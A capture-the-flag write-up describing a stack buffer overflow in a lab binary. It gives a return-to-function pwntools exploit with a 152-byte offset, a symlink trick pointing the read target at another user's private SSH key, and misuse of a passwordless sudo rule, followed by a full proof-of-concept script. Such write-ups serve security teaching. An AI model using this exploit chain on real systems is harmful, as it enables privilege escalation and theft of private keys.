
# Vulnerability
---

This challenge happens when we login as `junior-dev` after having resolved [[C4llb4ck]].

We directly find a txt file with some informations from the senior dev saying that there is a binary that is supposed to help *practicing* binary security, and that we have special privileges...
And that he left his private key file, but it's supposed to be protected.


### First step

We try the binary file, when we enter something in the input, if it's too large, it crashes.
So an overflow is possible.

By using `objdump`, we see the buffer is allocated *0x90* (144) bytes.
And in the source code, there is a function that will display the file `.ssh.id_rsa.pub`, and we know its adress (0x401176).

The overflow allow us to overwrite the `ret` register. It is supposed to contain the address of the function to return to, when the ongoing one stops.
So if we write too many characters in the buffer, we overflow some registers:

```txt
+---------------------+ 
| 0x4011ec            | ← RET (8 bytes)
+---------------------+ 
| 0x7fffffffe4f0      | ← RBP (8 bytes)
+---------------------+ 
|                     | ← Buffer (144 bytes)
|       ...           |
+---------------------+
```


Here is the first exploit created in order to execute the read_ssh function.

```python
#!/usr/bin/env python3

import pwn

def exploit_rettofunc():
    p = pwn.process('./read-pub-ssh')
    offset = 152
    read_ssh_addr = 0x401176
    ret_addr = 0x401016
    payload = b'A' * offset + pwn.p64(ret_addr) + pwn.p64(read_ssh_addr)
    p.sendline(payload)
    p.interactive()

```

We overflow the buffer. (With 152, and not 144, otherwise we segfault because  of an alignment problem).

And we can see our public key !

The challenge is almost completed, it could just be interesting to read the senior_ssh private key instead.
For that we can create a symlink :

```
lrwxrwxrwx 1 junior-dev developers   10 May  8 08:35 id_rsa.pub -> senior_ssh
-r-------- 1 senior-dev developers  411 Apr 30 12:38 senior_ssh

```

But when we re execute the exploit, we get a Permission denied.

When we look at `sudo -l`, we see that we can execute the script as the senior-dev without any password.

So we convert the python script in order to execute directly in the terminal:

```bash
python3 -c "from pwn import *; import sys; sys.stdout.buffer.write(b'A'*152 + p64(0x401016) + p64(0x401176))" | sudo -u senior-dev ./read-pub-ssh
```

And that's almost it !
Now that we have its key, we can transfer it to our host machine, and ssh with :

`ssh -i ./senior_ssh senior-dev@ecorp.cyber.epitest.eu -p 5597`

We find a txt file with the flag (as being a secret API key).


# PoC
---

```python
from pwn import *
import os
import subprocess

def create_symlink():
    ssh_dir = os.path.expanduser("~/.ssh")
    symlink_path = os.path.join(ssh_dir, "id_rsa.pub")
    target_path = os.path.join(ssh_dir, "senior_ssh")

    if os.path.exists(symlink_path) or os.path.islink(symlink_path):
        os.remove(symlink_path)

    os.symlink(target_path, symlink_path)
    print(f"[+] Symlink created : {symlink_path} -> {target_path}")

def build_payload():
    offset = 152
    ret_gadget = 0x401016
    read_ssh_addr = 0x401176

    payload = b'A' * offset
    payload += p64(ret_gadget)
    payload += p64(read_ssh_addr)

    return payload

def execute_exploit(payload):
    binary_path = "./read-pub-ssh"

    if not os.path.exists(binary_path):
        print(f"[!] Error : The binary {binary_path} does not exist.")
        return

    print("[+] Executing binary file with payload...")
    process = subprocess.Popen(
        ["sudo", "-u", "senior-dev", binary_path],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=False
    )

    stdout, stderr = process.communicate(input=payload)

    if stdout:
        print("[+] Output of the binary :")
        print(stdout.decode("utf-8", errors="ignore"))
    if stderr:
        print("[!] Error :")
        print(stderr.decode("utf-8", errors="ignore"))

def main():
    print("[*] Start of exploit")

    create_symlink()

    payload = build_payload()
    print(f"[+] Payload built (size : {len(payload)} bytes)")

    execute_exploit(payload)

    print("[*] Exploit done.")

if __name__ == "__main__":
    main()

```


